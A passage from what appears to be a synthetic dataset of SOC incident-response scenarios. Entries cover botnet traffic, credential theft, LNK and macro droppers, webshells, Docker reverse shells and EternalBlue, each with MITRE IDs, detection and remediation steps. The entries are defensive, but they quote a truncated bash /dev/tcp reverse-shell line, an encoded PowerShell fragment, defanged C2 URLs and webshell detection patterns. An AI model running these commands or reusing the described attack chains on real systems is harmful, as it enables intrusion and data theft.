- **Attack Steps**: Azure Security Center flags VM app-prod-east for multiple outbound attempts to IPs tied to Mirai botnet. Suricata alerts on outbound SYN flood traffic. SOC sends cloud EDR API command to isolate instance — disables all outbound except management interface. Flow logs show traffic patterns consistent with brute-force SSH attempts. Analysts snapshot VM disk, perform forensics using Suricata + Sysmon + auditd. Root cause traced to default SSH password hardcoded in config. SOC revokes cloud keys, rotates instance credentials, and deploys WAF rules for SSH rate-limit. EDR rules adjusted to trigger faster botnet detection in East DC region.
- **Detection**: Netflow → Suricata → EDR → snapshot
- **Solution**: Flow + SSH brute + Suricata
- **Tags**: #cloudisolation #azureedr #botnetcontainment

## Isolation of Developer Machine After Suspicious Git Credential Dump

- **Attack Type**: Git Credential Theft
- **Target**: Windows (Developer Machine)
- **Vulnerability**: Git secrets exfiltration via script
- **MITRE**: T1552.001
- **Impact**: Malicious script → git creds → isolate
- **Tools**: CrowdStrike Falcon, Git Logs, Sysinternals, Strings, PEStudio
- **Scenario**: EDR alerts on credential file access post malicious script execution
- **Attack Steps**: SOC receives Falcon alert: git-credentials file accessed immediately after suspicious script (install_theme.py) runs. Dev confirms no intent. Binary analyzed via PEStudio reveals embedded Python interpreter calling subprocess.popen to read credential files. Memory forensics confirm plaintext token dump from .gitconfig and git-credentials. System is isolated via Falcon one-click network disconnect. Zeek logs show outbound beaconing to code-sync[.]cc. SOC removes access tokens, forces MFA reissue, invalidates existing access keys from GitHub, and deploys EDR detection for filesystem + Git combo triggers in developer environments.
- **Detection**: Git token read → beacon → remote post
- **Solution**: Falcon + Git logs + script decode
- **Tags**: #gitsteal #devmachine #tokenabuse

## HR Laptop Isolated After Execution of LNK File From SMB Share

- **Attack Type**: LNK Shortcut Exploit
- **Target**: Windows
- **Vulnerability**: LNK → hidden PS → DLL inject → isolate
- **MITRE**: T1204.002, T1055
- **Impact**: Shortcut abuse via SMB → live payload
- **Tools**: PEStudio, SMB Logs, Sysinternals Autoruns, EDR Console
- **Scenario**: Malicious .lnk executed from SMB share triggers payload
- **Attack Steps**: User double-clicks Policies2025.lnk from \\corp-net\HR-Shared. Shortcut executes hidden cmd.exe /c powershell to pull malicious DLL from \\corp-net\Hidden. DLL injects shellcode via VirtualAllocEx. EDR shows anomalous inter-process activity. Autoruns confirms shortcut persistence created via Startup. SOC triggers network isolation and blocks all access to originating SMB share. PEStudio confirms shellcode mimics user activity to evade AV. SOC pulls drive shadow copies, adds .lnk execution alert to EDR policies, and notifies IT to sweep all HR endpoints for shortcut file hash.
- **Detection**: .lnk → cmd → ps1 → dll → inject
- **Solution**: Autoruns + PS logs + DLL mapping
- **Tags**: #lnkexploit #smbdrop #injectisolate

## Compromised Finance VM Isolated After Exfiltration to Pastebin

- **Attack Type**: Data Exfiltration via Paste Site
- **Target**: Windows VM
- **Vulnerability**: Script-based data theft via public service
- **MITRE**: T1041, T1059.001
- **Impact**: File export to public pastebin API
- **Tools**: Suricata, EDR, ProcMon, Any.Run, HTTP Logs
- **Scenario**: Internal files posted to pastebin using script
- **Attack Steps**: EDR flags report_export.ps1 containing base64 blob writing company financials to pastebin[.]com/api. SOC captures live traffic using Suricata and confirms POST requests with encoded .xls content. ProcMon logs identify original script spawned by scheduled task created 3 days prior. Memory dump shows hardcoded API key to pastebin used in PS script. VM is isolated by removing NIC, redirecting all outbound via firewall blackhole route. SOC invalidates API key, notifies pastebin abuse team, blocks domain in proxy stack, and creates YARA rule to flag scripts matching same encode → post pattern.
- **Detection**: PS encode → pastebin post → isolate
- **Solution**: Suricata + memory + script trace
- **Tags**: #exfiltration #pastebin #powershellexport

## Isolation of Misconfigured Jump Server After Unauthorized SSH Behavior

- **Attack Type**: SSH Tunnel Misuse
- **Target**: Linux Server
- **Vulnerability**: SSH misuse → tunnel → cron shell
- **MITRE**: T1090.001, T1078
- **Impact**: SSH tunnel bypass → isolate → revoke
- **Tools**: Auditd, UFW Logs, EDR, Zeek, SSHD Logs
- **Scenario**: Jumpbox used for reverse SSH tunnel to attacker infra
- **Attack Steps**: Zeek detects long-running outbound SSH from jump server to 123.45.67.89 with -R flag. SSHD logs confirm tunnel established from internal port 22 to attacker’s 4444. Auditd shows new file /etc/cron.hourly/sync.sh created during session. SOC disables UFW on host, revokes SSH key, then issues EDR-driven network isolation. Memory captured with indicators of active TTY hijacking tool. SOC deletes SSH key from known_hosts enterprise-wide, deploys centralized jumpbox logging enforcement, and configures alerting on SSH with -R/-L flags in scripts.
- **Detection**: SSH -R → cron → hijack trace
- **Solution**: Zeek + cron audit + EDR flow
- **Tags**: #sshtunnel #jumpserver #isolationlinux

## Isolation of Server Following Nginx Log Tampering After Web Shell Drop

- **Attack Type**: Web Shell Persistence
- **Target**: Linux Web Server
- **Vulnerability**: Log tamper to hide web shell install
- **MITRE**: T1565.001, T1100
- **Impact**: POST drop → log tamper → isolate host
- **Tools**: Nginx Logs, Auditd, chkrootkit, CrowdStrike, FIM
- **Scenario**: Nginx log modified to hide web shell upload evidence
- **Attack Steps**: SOC alerted after FIM tool flags unexpected modification in /var/log/nginx/access.log. Timeline shows POST to upload.php shortly before log entry is erased. Analysts find backdoor in /var/www/html/cache/wp-plugg.php. CrowdStrike isolates server, blocking it from public and lateral access. Auditd confirms attacker escalated via SUID misconfig. chkrootkit shows no kernel-level compromise. SOC restores logs from backup, recovers original POST payload, blacklists IP, triggers deep web scan for possible web shell variants across sibling VMs, and adds log write alerts to SIEM rules.
- **Detection**: upload.php → hidden PHP → log clean
- **Solution**: FIM + log diff + web root scan
- **Tags**: #webshell #nginxlog #containment

## Rogue IT Laptop Disconnected After Detecting Unapproved Cobalt Strike Beacon

- **Attack Type**: Beacon Detection
- **Target**: Windows
- **Vulnerability**: Internal red team test without authorization
- **MITRE**: T1071.001
- **Impact**: Unauthorized CS usage → SOC isolate
- **Tools**: Cobalt Strike, Wireshark, Splunk, Zeek, Defender ATP
- **Scenario**: Unapproved red team test triggers production containment
- **Attack Steps**: Splunk dashboard shows suspicious beaconing pattern using HTTP POST to domain mimicking Slack. Zeek confirms packet headers matching Cobalt Strike malleable profile. Host traced to IT-Audit-3, running unmanaged build of Cobalt for local test. SOC performs emergency isolation, disables user AD account, and begins incident procedure. Post-mortem reveals internal red team failed to notify SOC of test. SOC enforces red team declarations policy, creates DNS rules to block domains matching common malleable profiles, and reimages rogue asset.
- **Detection**: Beacon match → Zeek alert → isolate
- **Solution**: Splunk + CS config trace
- **Tags**: #cobaltstrike #redteamabuse #beacondetect

## EDR Isolation Triggered After RAR File With Weaponized Script Found on Desktop

- **Attack Type**: Archive With Dropper
- **Target**: Windows
- **Vulnerability**: RAR → VBS → PS → EXE chain
- **MITRE**: T1204.002, T1059.005
- **Impact**: Archive + script loader + task create
- **Tools**: WinRAR, Defender EDR, PEStudio, ProcMon
- **Scenario**: Malicious .rar drops VBS → PS chain → downloader
- **Attack Steps**: File cv_drop.rar found on desktop contains resume.vbs which silently executes PowerShell one-liner to fetch loader.exe. EDR detects file creation in AppData\Local\Temp\. PEStudio confirms UPX-packed binary and no PDB signature. ProcMon shows scheduled task UpdateChecker created immediately. SOC isolates endpoint, triggers file scan across org for matching RAR hash. Recovered dropper uses obfuscated VBS to build PS string char-by-char. SOC disables WinRAR scripting and adds .rar with embedded scripts to file monitoring alert system.
- **Detection**: RAR → VBS → PS → task + dropper
- **Solution**: EDR + PEStudio + ProcMon
- **Tags**: #archivedropper #vbschain #taskinject

## AWS EC2 Instance Isolated After Hosting Phishing Page

- **Attack Type**: Cloud Phishing Host
- **Target**: AWS EC2
- **Vulnerability**: Cloud phishing → EDR shutdown
- **MITRE**: T1583.006, T1584
- **Impact**: EC2 → phishing page → key stolen
- **Tools**: AWS Inspector, Suricata, Route53 Logs, CloudTrail
- **Scenario**: EC2 spun up to host malicious login portal
- **Attack Steps**: External phishing detection service flags logincloud-sso[.]com, hosted on EC2 linked to enterprise account. CloudTrail shows compromised credentials used to create instance, install Apache, deploy cloned login form. Suricata logs confirm GET requests with stolen credentials from corporate users. SOC issues AWS API command to shut down instance and isolate associated IAM user. Further audit finds access key was leaked via GitHub Gist. SOC performs GitHub takedown, rotates keys, applies SCP to block EC2 in unapproved regions, and tags all future EC2 with inspection triggers.
- **Detection**: Trail → Suricata → API block
- **Solution**: CloudTrail + Suricata + domain report
- **Tags**: #awsphishing #ec2containment #cloudresponse

## EDR Isolation After Exploit of Unpatched Zoom Client on Host

- **Attack Type**: Zoom Exploit
- **Target**: Windows
- **Vulnerability**: Zoom RCE → process chain → EDR isolate
- **MITRE**: T1203, T1059.001
- **Impact**: Zoom exploit → PS beacon → memory edit
- **Tools**: Zoom, CrowdStrike, ProcMon, PEStudio, Any.Run
- **Scenario**: Click on malicious Zoom invite leads to RCE exploit
- **Attack Steps**: Zoom invite leads to meeting ID hosted by attacker. Malformed video stream triggers buffer overflow in outdated Zoom client (ver. 5.4.x). CrowdStrike EDR detects memory corruption and launches isolation. ProcMon identifies zoom.exe spawning cmd.exe → powershell download of taskupdater.exe. PEStudio flags anomalous import table and encrypted sections. Any.Run shows persistence via registry and C2 via DNS TXT records. SOC disables all legacy Zoom versions org-wide via software policy, and introduces behavior-based Zoom event monitoring via EDR.
- **Detection**: Zoom → cmd → powershell → exe
- **Solution**: EDR + ProcMon + memory profile
- **Tags**: #zoomexploit #videorce #containment

## Host Isolation After Drive-By Download from Compromised News Site

- **Attack Type**: Drive-By via Browser Exploit
- **Target**: Windows + Browser
- **Vulnerability**: JS drive-by → dropper → hollowing
- **MITRE**: T1189, T1055
- **Impact**: Browser → iframe → hollowing → isolate
- **Tools**: Chrome DevTools, Suricata, Defender ATP, PEStudio
- **Scenario**: User visits news site → silent script loads payload
- **Attack Steps**: News site dailyreport[.]news injects iframe pointing to cdn.trackerfeeds[.]xyz/script.js. Script fingerprinting user agent loads obfuscated blob via JS which writes dropper update.exe to Temp folder. Defender ATP flags execution and process hollowing attempt into rundll32.exe. PEStudio reveals sandbox-evasion logic checking for mouse movement. Suricata detects abnormal DNS beacon pattern. SOC isolates host, purges dropped binary, creates Chrome extension policy to block inline script execution, and adds DNS domain to sinkhole.
- **Detection**: News iframe → JS blob → EXE inject
- **Solution**: Suricata + DNS + JS eval trace
- **Tags**: #driveby #jsexploit #browsercontainment

## Isolation of Research Laptop Following Abuse of SysInternals Tools for Credential Harvesting

- **Attack Type**: Living off the Land Tool Misuse
- **Target**: Windows Laptop
- **Vulnerability**: PsExec & ProcDump for token theft
- **MITRE**: T1003.001, T1077
- **Impact**: LOLBin chain → PsExec → procdump → isolate
- **Tools**: EDR, Sysmon, Volatility, PEStudio, Sigma Rules
- **Scenario**: SysInternals PsExec + ProcDump used post-infection
- **Attack Steps**: Analyst detects PsExec initiated from host RND-LAP01 to internal database server using local admin credentials. EDR flags the PsExec child process spawning procdump64.exe targeting lsass.exe. SOC immediately isolates the laptop via EDR command: NIC disabled, USB blocked, and endpoint locked. Volatility memory dump of lsass reveals password hashes and tokens. Timeline analysis shows execution chain: initial infection via email -> payload drop -> privilege escalation -> PsExec lateral attempt. Host is forensically preserved, logs extracted, Sysmon correlated with Sigma rules for unauthorized tool execution. Remediation involves AD password resets, GPO restrictions on PsExec, and application control policies to block similar tools unless signed and whitelisted.
- **Detection**: EDR detects chain → memory capture → restrict tools
- **Solution**: Sysmon + EDR + token dump
- **Tags**: #lolbins #syinternals #psExecAttack

## Endpoint Quarantined After Unauthorized Chrome Extension Starts Exfiltrating Clipboard Content

- **Attack Type**: Browser Extension Abuse
- **Target**: Windows Workstation (Browser)
- **Vulnerability**: Clipboard scraping via browser plugin
- **MITRE**: T1115
- **Impact**: JS + extension + fetch loop + exfiltrate
- **Tools**: Chrome DevTools, Suricata, Zeek, Defender ATP, Chrome Policy
- **Scenario**: Chrome extension stealing clipboard via JS
- **Attack Steps**: SOC flags outbound connections from workstation to ext-api.clipsync[.]co. Chrome extension audit shows recently installed extension Clipboard Master from third-party store. DevTools reveals JS polling navigator.clipboard.readText() every 10s and pushing via fetch to remote server. Defender ATP alert is triggered and auto-isolates host. Chrome Policy audit shows user override for extension install. Zeek confirms consistent beaconing pattern with embedded clipboard strings in GET payload. SOC forces removal of extension enterprise-wide, updates Chrome policy to block non-verified sources, and rotates sensitive clipboard-handled credentials (e.g., tokens). User receives phishing training.
- **Detection**: DevTools + EDR + DNS → isolate → rotate creds
- **Solution**: Chrome policy + Zeek flow + clipboard trace
- **Tags**: #chromeexploit #browserplugin #clipsteal

## Internal Developer Host Isolated After Reverse Proxy Created via Ngrok Without Approval

- **Attack Type**: Tunneling Tool Misuse
- **Target**: Developer Laptop
- **Vulnerability**: Reverse tunnel with internal resource exposure
- **MITRE**: T1572
- **Impact**: Ngrok reverse tunnel → dashboard exposed → isolate
- **Tools**: Ngrok, Suricata, CrowdStrike, SIEM, Asset Inventory
- **Scenario**: Developer opens reverse tunnel exposing internal dashboard
- **Attack Steps**: Suricata alerts show inbound TCP from external IP to dynamic ngrok.io subdomain resolving internally. SIEM logs identify traffic bound to internal dev dashboard (port 8080) exposed from DEV-LAP04. CrowdStrike confirms ngrok.exe was executed with authtoken and session active for 6+ hours. Host immediately isolated through CrowdStrike network containment action. EDR memory snapshot captures API keys in CLI. Security team disables local dev server, revokes tokens, blocks ngrok domain/org-wide, and integrates new controls via firewall egress rules. Policy rolled out to prevent unauthorized reverse proxy tools from executing.
- **Detection**: Suricata + SIEM + EDR CLI dump
- **Solution**: Tunnel behavior + asset policy + blacklist
- **Tags**: #ngrok #reverseproxy #tunneldetect

## Host Isolated After PDF Dropper Bypasses AV, Launches Hidden VBS to Inject Payload

- **Attack Type**: Malicious Document Execution
- **Target**: Windows
- **Vulnerability**: PDF → hidden VBS → download payload
- **MITRE**: T1203, T1059.005
- **Impact**: PDF abuse via script embed → isolate
- **Tools**: PDF Stream Dumper, PEStudio, EDR, Autoruns, Event Viewer
- **Scenario**: PDF with embedded script launches payload using WScript
- **Attack Steps**: HR personnel opens Resume_Tech2025.pdf from email, triggering macro-like behavior even in non-edit mode. EDR flags WScript.exe spawned with hidden VBS file extracted from PDF object stream. resume.vbs downloads imgupdate.exe, a heavily obfuscated binary. PEStudio detects no imports, only shellcode. Memory analysis shows hollowing into rundll32.exe. SOC isolates host using EDR, prevents lateral spread. Autoruns traces the persistence to modified startup registry. EDR forensics toolkit correlates document fingerprint and stops all similar hash files in org. Email source domain blocked, and SOC deploys detection for non-standard PDF objects with embedded scripts.
- **Detection**: Stream → VBS → EXE inject → mem
- **Solution**: PDF dump + autorun trace + memory hollowing
- **Tags**: #pdfdropper #vbsloader #scriptinject

## Laptop Isolated After Local Batch File Attempts AV Disabling via Registry & WMI

- **Attack Type**: Local Tamper Script
- **Target**: Windows
- **Vulnerability**: Batch + reg + WMI → AV bypass attempt
- **MITRE**: T1562.001
- **Impact**: Batch script + registry + WMI combo → isolate
- **Tools**: Sysinternals, Registry Monitor, PowerShell Logs, Defender ATP
- **Scenario**: Batch script uses regedit and WMI to disable Defender
- **Attack Steps**: User executes boostspeed.bat claiming to speed up performance. Script attempts to disable Defender using registry edits (HKLM\SOFTWARE\Microsoft\Windows Defender\DisableAntiSpyware) and executes WMI queries to stop services. Defender ATP logs action and auto-isolates system. SOC confirms batch file sourced from C:\Users\Public\Downloads, dropped via USB. PS logs reveal WMI usage like Get-WmiObject for service enumeration. Volatility shows attempted injection into taskhostw.exe blocked by ASR rule. SOC reimages host, implements GPO for blocking registry tampering and restricts WMI interface access to admin accounts only.
- **Detection**: Registry abuse → service stop → memory hook
- **Solution**: Registry logs + PS audit + EDR block
- **Tags**: #bypasstool #wmiexploit #defendertamper

## Web Developer Host Quarantined After Shadow IT Hosting of PHP C2 Panel

- **Attack Type**: Insider Shadow C2 Deployment
- **Target**: Internal Web Dev
- **Vulnerability**: Shadow C2 panel hosted on dev machine
- **MITRE**: T1505.003
- **Impact**: Webshell C2 installed for internal access
- **Tools**: Web Logs, Apache, Zeek, Defender ATP, PHP Decode
- **Scenario**: Employee secretly hosts webshell panel on test box
- **Attack Steps**: Zeek logs show outbound HTTP POST requests from internal system to 127.0.0.1/admin/connect.php. Analysts trace to WEBDEV03, hosting Apache and PHP locally. EDR reveals file named connect.php with webshell C2 panel matching GitHub-known variant. Apache logs confirm admin login via VPN session. Host is quarantined, local web root preserved. SOC questions employee, removes hosting tools, disables port 80 across non-approved systems, and initiates insider threat investigation. New rule flags internal PHP panel activity and detects known shell syntax (e.g., eval(base64_decode())).
- **Detection**: Apache logs + webshell script + VPN audit
- **Solution**: EDR + PHP eval trace + shell audit
- **Tags**: #webpanel #insiderabuse #phpc2

## Endpoint Isolated After Unapproved Docker Image Runs Reverse Shell Script

- **Attack Type**: Docker Container Misuse
- **Target**: Linux (Docker Host)
- **Vulnerability**: Reverse shell via Docker script
- **MITRE**: T1059.004, T1210
- **Impact**: Bash shell from container → isolate
- **Tools**: Docker Logs, Suricata, Auditd, Sysmon, Defender ATP
- **Scenario**: Rogue container opens bash shell to external IP
- **Attack Steps**: SOC sees alert from Defender ATP: reverse shell initiated via bash from 172.20.1.4. Docker logs trace this to container named analytics-runner, pulled from DockerHub by data science intern. Bash shell from container initiates outbound connection to attacker-node[.]cf. Auditd logs reveal entrypoint script contains /bin/bash -i >& /dev/tcp/.... SOC isolates host, halts Docker daemon, and suspends intern account. Forensic snapshot of container is preserved. Org updates image vetting process, blocks direct pulls from public DockerHub, and adds inline AV scan for container filesystem layers.
- **Detection**: Container start → bash → shell
- **Solution**: Docker audit + Suricata + inline AV
- **Tags**: #dockershell #containerabuse #bashreverse

## Host Quarantined After Exploit Attempt Against SMBv1 Service via EternalBlue

- **Attack Type**: EternalBlue Exploit Attempt
- **Target**: Windows Server
- **Vulnerability**: Unpatched SMB exploited remotely
- **MITRE**: T1210, T1048
- **Impact**: EternalBlue against DC → isolate fast
- **Tools**: SMB Logs, Wireshark, Metasploit Framework, Defender ATP
- **Scenario**: Exploit script targets unpatched host over SMBv1
- **Attack Steps**: Wireshark captures SMB request from attacker subnet 10.10.12.6 attempting EternalBlue exploit against FINANCE-DC1. Defender ATP flags memory allocation pattern consistent with shellcode injection via Srv.sys. EDR automatically isolates host. SOC uses Metasploit framework to validate the signature of exploit payloads. SMB logs confirm malformed trans2 requests consistent with CVE-2017-0144. Patch not applied due to testing oversight. SOC applies Microsoft hotfix, scans entire network for SMBv1 presence, and implements SMB signing/encryption org-wide. Zeek rule created for malformed SMB packets post patch.
- **Detection**: SMBv1 exploit → shellcode pattern
- **Solution**: SMB logs + memory dump + signature
- **Tags**: #eternalblue #smbexploit #patchmissing

## Host Isolated After Beaconing to Telegram Bot API From Internal Script

- **Attack Type**: C2 via Messaging API
- **Target**: Windows
- **Vulnerability**: C2 via public messaging API
- **MITRE**: T1105, T1132
- **Impact**: Macro → keystrokes → Telegram API
- **Tools**: API Logs, Defender EDR, Splunk, Wireshark, Volatility
- **Scenario**: Script abuses Telegram API for C2 communication
- **Attack Steps**: Splunk and EDR detect consistent HTTPS POST to api.telegram.org/botXXXX/sendMessage. Volatility confirms memory-resident script embedded in Excel macro. Macro, extracted via OLETools, uses WinHTTP COM to post exfiltrated user keystrokes. Wireshark captures packet with message body base64 of typed characters. Host is isolated, script hash fed into IOC pipeline. SOC initiates audit for macro-enabled documents org-wide and disables macro execution via GPO. Telegram domain is blocked on firewall, and internal detection rule built for sendMessage API + base64 in content.
- **Detection**: Excel → macro → WinHTTP → exfil
- **Solution**: API monitor + Excel OLE + DNS detect
- **Tags**: #telegramc2 #macroabuse #keysteal

## Remote Host Contained After PowerShell-Based Downloader Uses Google Docs as Payload Host

- **Attack Type**: Cloud Service Abuse
- **Target**: Windows
- **Vulnerability**: Cloud download abused to deliver EXE
- **MITRE**: T1567.002, T1059.001
- **Impact**: PS → cloud doc → binary → beacon
- **Tools**: Google Drive Logs, Defender ATP, PowerShell Logs, Zeek
- **Scenario**: PS script fetches payload from public Google Doc
- **Attack Steps**: Defender ATP detects Invoke-WebRequest targeting docs.google[.]com/uc?id=.... PS script downloads invoice_tools.exe disguised as doc content. PEStudio shows malformed section headers, high entropy. File performs C2 via HTTP POST to remote IP. PowerShell logs confirm chain launched via task scheduler. Host isolated via EDR. Drive download history analyzed, offending Doc taken down. New firewall policy blocks download links with uc?id= pattern. SOC warns users about cloud-hosted binary risk and disables Task Scheduler for standard users.
- **Detection**: Task → PS → cloud fetch → execute
- **Solution**: GDrive logs + PS + beacon detect
- **Tags**: #googledrive #powershelldropper #cloudabuse

## Suspicious PowerShell Encoded String Triggers Initial Alert Investigation

- **Attack Type**: Initial Alert Triage
- **Target**: Windows Workstation
- **Vulnerability**: Phishing + PowerShell Execution
- **MITRE**: T1059.001, T1566.002
- **Impact**: Suspicious encoded PS triggers SOC hunt
- **Tools**: Defender ATP, PowerShell Logs, Email Header Analysis
- **Scenario**: EDR detects obfuscated PowerShell from Outlook
- **Attack Steps**: EDR flags encoded PowerShell via Outlook attachment trigger. Alert metadata indicates suspicious email with .lnk attachment opens hidden PowerShell using base64 command. SOC cross-checks user activity and timestamps: powershell -enc JAB3AGg.... PS logs show connection to external IP, registry edits, and download activity. Analysts check email headers and find spoofed internal domain with mismatched SPF/DKIM. Email metadata reveals sender's IP originates from Nigeria. Network logs show correlated DNS query spike. SOC flags email pattern, blocks sender domain, updates AV signature with encoded hash, and confirms with user no expected mail. Alert upgraded from medium to high severity with contextual risk.
- **Detection**: PS Logs → alert + header → isolation readiness
- **Solution**: Defender + PS decode + email trace
- **Tags**: #alerttriage #obfuscation #psencoded

## Real-Time Triage of Anomalous Network Spike Linked to Crypto-Mining DLL

- **Attack Type**: Initial Alert Triage
- **Target**: Windows
- **Vulnerability**: Network beacon + DLL mining
- **MITRE**: T1496, T1055
- **Impact**: Beacon + memory DLL + miner
- **Tools**: Suricata, Zeek, EDR, Procmon
- **Scenario**: Suricata alert flags consistent outbound traffic pattern
- **Attack Steps**: Suricata IDS flags internal host making repeated connections to mining pool IPs. Zeek flow confirms consistent high-volume outbound port 3333. SOC queries EDR telemetry: system process svchost.exe launching cryptominer.dll. Process tree analyzed via Procmon confirms DLL side-loaded via winstart.exe. Lateral movement logs show similar behavior on adjacent hosts. SOC escalates initial alert, isolates endpoint, scans other hosts for same DLL hash. SIEM correlation confirms scheduled task persistence. Firewall updated to block mining pool domains.
- **Detection**: Net + proc chain + DLL match
- **Solution**: Zeek + Procmon + Suricata alert
- **Tags**: #cryptomining #dllinject #alertvalidation

## Malware Sample Dropped in Temp via MSI Install — Static & Dynamic Analysis Initiated

- **Attack Type**: Malware Analysis (Static + Dynamic)
- **Target**: Windows
- **Vulnerability**: MSI → EXE loader → reverse shell
- **MITRE**: T1059.001, T1203
- **Impact**: Packed EXE in MSI + shell behavior
- **Tools**: PEStudio, Any.Run, Ghidra, Defender ATP
- **Scenario**: MSI installs backdoor silently on engineer's laptop
- **Attack Steps**: EDR detects suspicious installer.msi dropped in C:\Temp\, running as SYSTEM. PEStudio reveals binary with UPX packing, high entropy, no icons, and suspicious section names like .silent, .bypass. Any.Run detonation shows post-install behavior creating reverse shell via TCP:4444. Ghidra static reverse engineering identifies imported function CreateProcessA chaining to obfuscated PowerShell blob. SOC validates sample as variant of known RAT. Containment team issues IOC sweep org-wide, blocks domain, alerts security vendors.
- **Detection**: MSI drop → unpack → PS loader
- **Solution**: PEStudio + AnyRun + Ghidra trace
- **Tags**: #staticdynamic #msidropper #malwarereview

## Reverse Engineering Downloader Malware with Embedded XOR Key

- **Attack Type**: Malware Analysis (Static + Dynamic)
- **Target**: Windows
- **Vulnerability**: XOR-packed downloader + injection
- **MITRE**: T1027.002, T1055
- **Impact**: XOR obfuscation → loader → explorer inject
- **Tools**: PEStudio, x64dbg, XORSearch, Ghidra
- **Scenario**: Executable drops from email opens XOR-obfuscated payload
- **Attack Steps**: Sample analyzed shows obfuscated strings and encrypted sections. PEStudio reveals XOR patterns. XORSearch finds embedded key 0x52. Decrypted string points to hxxp://drop.trojan[.]ru/payload.exe. Using x64dbg, analysts step through payload loader and identify injection into explorer.exe. Ghidra static review shows timer-based execution and sleep-evasion tactics. SOC updates YARA rules to catch same XOR key and obfuscation structure, while cloud sandbox detonation confirms domain and payload. Blocked at perimeter and uploaded to AV vendor.
- **Detection**: Decode → trace exec chain → block
- **Solution**: Ghidra + XORSearch + x64dbg
- **Tags**: #xorunpack #malwareloader #dynamictrace

## System Quarantined After Process Hollowing of svchost.exe via Reflective DLL

- **Attack Type**: Host Isolation & Containment
- **Target**: Windows
- **Vulnerability**: Reflective DLL + process hollowing
- **MITRE**: T1055.012
- **Impact**: svchost hollowed → host isolate → memory YARA
- **Tools**: CrowdStrike, PEStudio, Process Explorer, Memory Dump
- **Scenario**: Reflective DLL injects into core system process
- **Attack Steps**: EDR flags tempcleaner.exe spawning and then vanishing; memory scan reveals svchost.exe injected with foreign code. Process Explorer shows hollowed svchost PID with suspicious memory region. PEStudio shows the DLL is reflective loader — minimal imports, shellcode sections. SOC initiates network block on host, preserves RAM and performs YARA match on DLL. Host quarantined, user deauthenticated, endpoint forensically preserved. EDR policy updated to flag mismatched parent-child processes between system and user-space.
- **Detection**: Hollow + mem region + proc tree
- **Solution**: CrowdStrike + mem scan + PEStudio
- **Tags**: #hollowing #dllreflective #svchostattack

## Alert Triggered by Privileged Account Anomaly After Logon in Two Countries

- **Attack Type**: Initial Alert Triage
- **Target**: Cloud / SaaS
- **Vulnerability**: Token replay from phishing
- **MITRE**: T1078.004
- **Impact**: Impossible travel + download = compromise
- **Tools**: Azure AD, EDR, SIEM, Geo-IP
- **Scenario**: Login from India, then US within 3 mins
- **Attack Steps**: Alert fires in SIEM: account admin.seceng@org.com logs in from India and then 3 minutes later from IP in US. Geo-IP impossible jump logic flags alert. EDR confirms no VPN in use. Azure logs show token issued from India-origin browser session. US IP later pulls sensitive files from SharePoint. SOC confirms token replay attack. Account disabled, token revoked, IPs blacklisted, MFA logs inspected. All SharePoint downloads traced and reviewed.
- **Detection**: Geo IP + SaaS + EDR logs
- **Solution**: Azure + EDR token trace
- **Tags**: #tokenreplay #geoalert #cloudthreat

## Static and Dynamic Unpacking of GoLang Malware Targeting Finance Dept

- **Attack Type**: Malware Analysis (Static + Dynamic)
- **Target**: Windows
- **Vulnerability**: GoLang malware with C2
- **MITRE**: T1059.003, T1105
- **Impact**: Static bin → Ghidra unpack → C2 match
- **Tools**: Ghidra, Any.Run, PEStudio, GoDecoder
- **Scenario**: Go binary contains embedded C2 IPs
- **Attack Steps**: Finance workstation downloads invoice_request.exe. PEStudio shows Go binary with bloated .data and .rodata. Ghidra confirms Go main init routine and strings embedded via hex escape. Analysts extract C2 IP list from binary and detonate in Any.Run. Observed behavior includes registry key creation for persistence and C2 beacon via HTTP POST /heartbeat. SOC updates firewall rules to block IP, hashes flagged in SIEM, Ghidra script made to scan for new samples.
- **Detection**: HTTP beacon + reg + Go obfuscation
- **Solution**: Any.Run + static string decode
- **Tags**: #golangmalware #c2analyze #staticreview

## Containment of Lateral Spread Using Admin Shares from Compromised Workstation

- **Attack Type**: Host Isolation & Containment
- **Target**: Windows
- **Vulnerability**: Admin share lateral + PS dump
- **MITRE**: T1021.002, T1003.002
- **Impact**: C$ + PS + SAM extract → isolate & block
- **Tools**: PowerShell Logs, EDR, Admin Share Tracker
- **Scenario**: PS remoting across C$ share, dumping SAM
- **Attack Steps**: SOC receives alert of unusual PowerShell loop using Invoke-Command across multiple hosts via \\HR-PC01\C$\Users\.... Event logs show account svc-admin connecting with token theft. EDR isolates workstation HR-PC01, cuts network access, triggers user deauthentication across domain. Admin shares temporarily blocked via GPO. SOC adds detection for SMB + PowerShell combo and scans SAM registry artifacts on all targeted machines.
- **Detection**: Event logs + PS chain + GPO
- **Solution**: EDR + PS logs + SMB trace
- **Tags**: #adminshare #psremoting #samsteal

## Alert Escalation After Web Server Drops Suspicious Binary With Steganographic Payload

- **Attack Type**: Malware Analysis (Static + Dynamic)
- **Target**: Web Server / Windows
- **Vulnerability**: Stego + payload dropper
- **MITRE**: T1027.003, T1204.002
- **Impact**: Steg hidden EXE → trigger + drop + beacon
- **Tools**: StegDetect, Ghidra, x64dbg, EDR
- **Scenario**: Image file hides malicious EXE
- **Attack Steps**: Binary holiday_banner.png uploaded to web server triggers AV alert. Image contains hidden payload. Analysts use StegDetect to extract payload — revealed as invoice_generator.exe. PEStudio shows the file manually packed, triggers heuristics. Dynamic analysis via Any.Run reveals encoded instructions using stego image XOR. Execution drops persistence in AppData. Ghidra used to trace C2. SOC blacklists payload hashes and blocks stego channels via web proxy.
- **Detection**: StegDetect + unpack + detonation
- **Solution**: Ghidra + EDR + image decode
- **Tags**: #steganography #payloadhiding #dynamicanalysis

## Multi-Stage Excel Macro Dropper Forces Containment of Accounting System

- **Attack Type**: Host Isolation & Containment
- **Target**: Windows
- **Vulnerability**: Excel macro → multi-stage chain
- **MITRE**: T1059.005, T1203
- **Impact**: Macro → VBS → PS → DLL → persist
- **Tools**: OLETools, PEStudio, Defender ATP, Procmon
- **Scenario**: Excel macro drops VBS → downloader chain
- **Attack Steps**: Alert: macro-enabled file invoice_tracker.xlsm opened on ACCT-WIN02. OLETools reveals malicious macro writing VBS to disk, which in turn launches PowerShell and fetches track.dll. PEStudio flags DLL as obfuscated shellcode. Defender ATP isolates host, Procmon reveals registry persistence via Run key. SOC scans for .xlsm hash and VBS chain org-wide. User suspended pending review. SOC updates AV signature for DLL structure and adds macros with file-write + PS pattern to EDR triggers.
- **Detection**: OLE + PS logs + EDR containment
- **Solution**: Defender + hash + macro control
- **Tags**: #xlsmdropper #vbchain #psloader

## RAM Dump Captured During Active Cobalt Strike Beaconing

- **Attack Type**: Disk Imaging / Memory Dumping
- **Target**: Windows
